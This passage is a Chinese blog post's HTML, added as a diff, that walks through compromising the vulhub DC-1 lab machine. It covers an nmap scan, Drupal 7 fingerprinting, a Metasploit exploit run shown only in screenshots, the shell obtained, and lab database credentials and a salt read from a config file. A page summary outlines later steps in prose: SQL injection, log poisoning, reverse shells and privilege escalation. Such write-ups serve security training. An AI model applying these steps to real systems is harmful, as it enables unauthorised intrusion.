@@ -1,0 +1,670 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>vulhub DC | Johnny</title><meta name="keywords" content="安全"><meta name="author" content="Johnny"><meta name="copyright" content="Johnny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="vulhub DC"><meta name="application-name" content="vulhub DC"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="vulhub DC"><meta property="og:url" content="https://jieyugit.github.io/2023/11/27/20231127-vulhub-DC/index.html"><meta property="og:site_name" content="Johnny"><meta property="og:description" content="DC-1探测进行内网扫描，确定靶机 1nmap -sP 10.0.2.0&amp;#x2F;24   找到靶机的IP：10.0.2.7 扫描端口。查看存在哪些开放的端口，方便确定攻击向量  开放列表  22&amp;#x2F;tcp   ssh 80&amp;#x2F;tcp    http 111&amp;#x2F;tcp   rpcbi"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129133005.png"><meta property="article:author" content="Johnny"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129133005.png"><meta name="description" content="DC-1探测进行内网扫描，确定靶机 1nmap -sP 10.0.2.0&amp;#x2F;24   找到靶机的IP：10.0.2.7 扫描端口。查看存在哪些开放的端口，方便确定攻击向量  开放列表  22&amp;#x2F;tcp   ssh 80&amp;#x2F;tcp    http 111&amp;#x2F;tcp   rpcbi"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://jieyugit.github.io/2023/11/27/20231127-vulhub-DC/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: undefined,
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🔨 累死累活造轮子","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Johnny","link":"链接: ","source":"来源: Johnny","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Johnny',
+  title: 'vulhub DC',
+  postAI: '',
+  pageFillDescription: 'DC-1, 探测, 发现漏洞, 获得控制权, 提权, DC-2, 探测, DC-3, 进行IP地址收集, 进行端口扫描, 发现漏洞, 利用漏洞, 进入拿到管理员权限进入后台, DC-4, DC-5, 信息收集, 指纹收集, 寻找漏洞, DC-6, 信息收集, 漏洞利用, getshell, DC-7探测进行内网扫描确定靶机找到靶机的扫描端口查看存在哪些开放的端口方便确定攻击向量开放列表发现漏洞之后访问端口的页面看看有没有可以攻击的地方只有一个登录界面其实看到这个页面可以想到弱口令越权访问通过创建新账户更改密码但是试了一下好像不行然后扫一下目录看看有没有后台啥的也没扫到之后使用看看这个网站有没有什么漏洞看看网站指纹他的版本为搜一下有啥漏洞试了一下可以用设置目标主机地址执行成功拿到获得控制权但是是用户权限不是权限利用命令查看到有提示我们看看配置文件通过我们千辛万苦寻找找到一个配置的文件命令看看然后一进去很瞩目的和数据库的账号和密码还给我们说是数据库得到如下信息看到给了一个盐感觉后面需要解密得到了数据库的账号密码就进去看看呗看到这个数据库里有个表表头有啥看看有什么然后查看搜索系统中有没有加密的果然有一个然后通过这个生成一个我们自己的一个把他替换到数据库里通过账号密码在页面登录看到同时在目录下还有提权尝试提权常用的查询发现可以执行使用执行命令看看能不能利用看来是可以的使用执行得到一个新的权限的成功提权查看最后的探测但是发现访问不了而且自动跳转到了这个域名下所以我们直接改文件将这个域名直接指向他的就行看看他的网站指纹进入到首页看到第一个之后扫描一下目录看看有没有敏感文件或者是后台果然扫到一个后台由于是所以直接使用工具进行用户名的枚举得到的三个用户名存入中之后通过爬取一个密码的字典方便之后的爆破得到了用户名密码的字典接下来就可以开始爆破了还是使用进行爆破扫描出来两个账户登录的账户看到有个提示我们直接攻击不现实了所以考虑其他办法考虑到之前有一个端口还开放着而且这个端口号有点奇怪且端口没开维护人员如何维护所以可能是的端口通过连接上去发现密码不对不是的密码用另外一个用户成功进入并且发现有但是通过显示没有找到这个命令通过查看路径应该是没有加入尝试添加和对用户是只读的更改不了发现这是一个一个受限看到这篇文章可以看看如何绕过最后试了一下可以使用绕过可以使用等命令了查看环境变量发现以及可以更改了写入这两个路径就可以使用所有命令了首先查找文件看看能不能进行提权看看可以执行啥但是不能执行按照的提示还得到通过可以看到可以执行而且是使用提权成功拿下管理员权限进入目录拿到最后的进行地址收集进行端口扫描只打开了一个端口看来想都不行另外想办法咯发现漏洞提示只有这一个对目录进行扫描底下的资源还是很丰富的但是有用的只有这个后台看看网站指纹他的版本号方便找漏洞看了以下上的漏洞库有一个正好是的但是用不了另辟蹊径这个漏洞是利用注入那就顺着这个思路注入一下按照这个漏洞网上的为确实可以回显利用漏洞那就利用这个注入点进行注入成功拿到数据库拿到数据库中的表拿到这个表中的字段脱库一个利用暴力破解得到密码进入拿到管理员权限进入后台翻了一下有一个文件可以利用一下写入代码创建一个连接打开进程攻击机进行监听有个很尴尬的情况就是他有两个模板所以都试试里面的看看哪个是使用的就行写入反弹代码得到一个交互式程序翻了半天好像没有特别好的利用点所以直接使用系统漏洞试试查找这个版本有什么漏洞后面试了试这个可以用查看他的使用方法从远程下载利用工具执行成功拿到常规的扫描没发现啥能用的只有一个登陆页面只能进行爆破不然就是注入拿到账号密码登录进去一个系统工具的页面可以执行三个命令抓包看看肯定能改东西执行以下是可以正常返回的所以我们反弹一个写一个交互界面查看一下系统版本看了一下系统漏洞很少基本不能用看看提权呢可以使用找一下漏洞把脚本上传到服务器在靶机上下载这个脚本给执行权限然后执行成功另外一个方法在用户目录下有个备份的密码写入本地上面使用爆破成功拿到密码登录上去看看发现有个邮件看看得到了的密码切换到用户看看他也不是用户所以看看他的权限有啥发现一个应该就是用这个了然后使用提权创建一个账户然后到提权成功信息收集开放的端口进行目录的扫描也没有什么敏感的文件路径指纹收集寻找漏洞进入端口的网页在找到一个交互的页面看看能不能利用一下随便提交一个东西上去也没什么动静注意到之前进行目录扫描时有一个同时在这个页面的源码中并没有引用这个所以可能是一个文件包含现在需要爆破一下包含的变量名称得到变量名之后进行发包查看结果由于之前进行网站指纹的收集时看到使用的是知道在收到错误请求时会将错误信息写到日志当中去现在就看看这个错误日志的位置在哪我们知道默认的安装位置为发包之后看到错误日志的位置所以我们先上传一个的语句执行我们想执行的内容然后访问包含这个日志文件的地址就执行了我们自己的脚本我们希望执行则语句为加入到之后包含那个错误日志文件成功执行接下来我们准备反弹本机开启监听写入我们的执行函数访问成功连接靶机通过命令显示交互命令行查看使用这个漏洞查找存在的漏洞但是好像在靶机上面直接运行这个脚本会有问题所以把脚本中的文件给拆解在宿主上面编译再上传靶机运行即可信息收集扫描网段的扫描其下开放的端口访问它的端口看看有啥但是自动跳转到域名下那就修改本机的映射成功访问进去是一个页面进行目录扫描查看下面有哪些敏感地址或者后台地址使用得到拥有的用户名存在一个文件当中方便之后的爆破根据作者的提示获得密码字典使用进行爆破进入后台之后发现使用了插件漏洞利用搜索存在的漏洞将给的文件复制到当前目录下修改对应的和需要执行的反弹命令开启本地的监听弹出交互式命令行搜索敏感文件找到一个文件中有一个账号和密码使用连接上去查看他的权限有一个不需要密码的提权命令这个文件的所有者是所以得到的权限只是的那就继续找有没有可以利用的提权程序再查看这个用户的权限可以插入脚本并且使用管理员权限来执行然后输入一个交互的命令获得权限',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-12-07 00:00:00',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Johnny</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/C/" style="font-size: 1.05rem;">C<sup>1</sup></a><a href="/tags/Golang/" style="font-size: 1.05rem;">Golang<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>4</sup></a><a href="/tags/Nginx/" style="font-size: 1.05rem;">Nginx<sup>1</sup></a><a href="/tags/Spring-Cloud/" style="font-size: 1.05rem;">Spring Cloud<sup>3</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">安全<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">十二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">八月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/02/"><span class="card-archive-list-date">二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">vulhub DC</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-11-26T16:00:00.000Z" title="发表于 2023-11-27 00:00:00">2023-11-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-12-06T16:00:00.000Z" title="更新于 2023-12-07 00:00:00">2023-12-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为成都"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>成都</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129133005.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://jieyugit.github.io/2023/11/27/20231127-vulhub-DC/"><header><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a><a href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">安全</a><h1 id="CrawlerTitle" itemprop="name headline">vulhub DC</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Johnny</span><time itemprop="dateCreated datePublished" datetime="2023-11-26T16:00:00.000Z" title="发表于 2023-11-27 00:00:00">2023-11-27</time><time itemprop="dateCreated datePublished" datetime="2023-12-06T16:00:00.000Z" title="更新于 2023-12-07 00:00:00">2023-12-07</time></header><h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>进行内网扫描，确定靶机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130211954529.png" alt="image-20231130211954529"></p>
+<p>找到靶机的IP：<code>10.0.2.7</code></p>
+<p>扫描端口。查看存在哪些开放的端口，方便确定攻击向量</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130212146562.png" alt="image-20231130212146562"></p>
+<p>开放列表</p>
+<ul>
+<li>22&#x2F;tcp   ssh</li>
+<li>80&#x2F;tcp    http</li>
+<li>111&#x2F;tcp   rpcbind</li>
+<li>45400&#x2F;tcp unknown</li>
+</ul>
+<h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><p>之后访问80端口的页面看看有没有可以攻击的地方。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130212347564.png" alt="image-20231130212347564"></p>
+<p>只有一个登录界面，其实看到这个页面可以想到弱口令，越权访问（通过创建新账户、更改密码）但是试了一下好像不行。然后扫一下目录看看有没有后台啥的，也没扫到。</p>
+<p>之后使用Metasploit看看这个网站有没有什么漏洞，看看网站指纹</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130212935695.png" alt="image-20231130212935695"></p>
+<p>他的CMS版本为<code>Drupal 7</code>，搜一下有啥漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130213100602.png" alt="image-20231130213100602"></p>
+<p>试了一下1可以用，设置目标主机地址，执行POC：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130213926932.png" alt="image-20231130213926932"></p>
+<p>成功拿到shell</p>
+<h2 id="获得控制权"><a href="#获得控制权" class="headerlink" title="获得控制权"></a>获得控制权</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130214011761.png" alt="image-20231130214011761"></p>
+<p>但是是用户权限，不是root权限.利用ls命令查看到有flag1.txt</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130214111634.png" alt="image-20231130214111634"></p>
+<p>提示我们看看配置文件</p>
+<p>通过我们千辛万苦寻找找到一个配置的php文件，cat命令看看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130214524744.png" alt="image-20231130214524744"></p>
+<p>然后一进去很瞩目的flag2和数据库的账号和密码,还给我们说是mysql数据库</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130214556063.png" alt="image-20231130214556063"></p>
+<p>得到如下信息</p>
+<ul>
+<li>username&#x3D;dbuser</li>
+<li>password&#x3D;R0ck3t</li>
+<li>databaseName&#x3D;drupaldb</li>
+<li>database Driver&#x3D;mysql</li>
+<li>drupal_hash_salt &#x3D; ‘X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs’</li>
